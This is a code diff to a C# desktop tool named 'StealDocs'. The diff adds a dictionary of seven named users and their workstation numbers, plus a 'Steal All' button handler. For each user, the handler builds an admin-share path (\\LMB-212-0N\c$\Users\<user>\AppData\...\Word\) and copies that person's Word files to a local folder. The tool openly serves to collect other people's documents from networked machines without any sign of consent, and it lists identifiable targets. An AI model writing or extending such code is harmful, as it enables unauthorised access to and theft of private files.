@@ -29,12 +29,27 @@ namespace StealDocs
         public string sourceDirectory;
         public string targetDirectory;
 
+        //Ce Dictionnary va contenir la liste des gens et de leur numéro de poste.
+        public Dictionary<string, string> maListe = new Dictionary<string, string>();
+
+
+
         public MainWindow()
         {
             InitializeComponent();
 
-            /// Variables Globales
-            /// </summary>
+            // Ajout des éléments au dictionnary
+            maListe.Add("1", "schedert");
+            maListe.Add("2", "gontrana");
+            maListe.Add("4", "zimmermannr");
+            maListe.Add("5", "benderm");
+            maListe.Add("6", "kaufmanndw");
+            maListe.Add("7", "onganm");
+            maListe.Add("8", "rodriguesD");
+
+            //On met les valeurs dans la comboBox
+            comboBoxUser.ItemsSource = maListe;
+
         }
 
         /// <summary>
@@ -44,6 +59,10 @@ namespace StealDocs
 
         private void Button_Click(object sender, RoutedEventArgs e)
         {
+
+
+
+
             setUserPathAndNumerPoste();
             strBasePath = @"\\LMB-212-0";
             strWord = @"\AppData\Roaming\Microsoft\Word\";
@@ -86,44 +105,12 @@ namespace StealDocs
 
         public void setUserPathAndNumerPoste()
         {
-            String UserPath = User.Text;
-            String NumeroPoste = "1";
+            //reucpere le text affiché
+            String UserPath = comboBoxUser.Text;
+            //recupère la clé, qui correspond a son numero de poste
+            String NumeroPoste = comboBoxUser.SelectedValue.ToString();
 
-            switch (UserPath)
-            {
-                case "Thierry":
-                        UserPath = "schedert";
-                        NumeroPoste = "1";
-                    break;
-                case "Achilles":
-                        UserPath = "gontrana";
-                        NumeroPoste = "2";
-                    break;
-                case "Remy":
-                        UserPath = "zimmermannr";
-                        NumeroPoste = "4";
-                    break;
-                case "Maxence":
-                        UserPath = "benderm";
-                        NumeroPoste = "5";
-                    break;
-                case "Dwenn":
-                        UserPath = "kaufmanndw";
-                        NumeroPoste = "6";
-                    break;
-                case "Mehmet":
-                        UserPath = "onganm";
-                        NumeroPoste = "7";
-                    break;
-                case "Dilane":
-                        UserPath = "rodriguesD";
-                        NumeroPoste = "8";
-                    break;
-                default:
-                        UserPath = "kaufmanndw";
-                        NumeroPoste = "6";
-                    break;
-            }
+
 
 
             strUsername = UserPath;
@@ -143,6 +130,27 @@ namespace StealDocs
             string cheminFinal = chemin1 + userName + chemin2;
 
             return cheminFinal;
+        }
+
+        private void btnStealAll_Click(object sender, RoutedEventArgs e)
+        {
+            
+            foreach (KeyValuePair<string, string> entry in maListe)
+            {
+                // do something with entry.Value or entry.Key
+                String strTempNumeroPoste = entry.Key;
+                String strTempUserName = entry.Value;
+
+                strBasePath = @"\\LMB-212-0";
+                strWord = @"\AppData\Roaming\Microsoft\Word\";
+                sourceDirectory = strBasePath + strTempNumeroPoste + @"\c$\Users\" + strTempUserName + strWord;
+
+                var diSource = new DirectoryInfo(sourceDirectory);
+                var diTarget = new DirectoryInfo(targetDirectory);
+
+                CopyAll(diSource, diTarget);
+            }
+
         }
     }
 }
